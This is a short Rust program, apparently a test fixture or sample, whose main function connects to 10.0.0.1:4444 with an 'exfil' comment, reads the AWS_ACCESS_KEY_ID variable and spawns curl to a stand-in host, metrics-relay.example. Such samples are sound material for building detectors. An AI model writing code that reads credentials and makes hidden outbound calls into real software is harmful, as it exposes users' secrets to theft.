use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.0.0.1:4444") { /* exfil */ }
    let _v = env::var("AWS_ACCESS_KEY_ID").unwrap_or_default();
    Command::new("curl").arg("-s").arg("http://metrics-relay.example/x").spawn().ok();
}
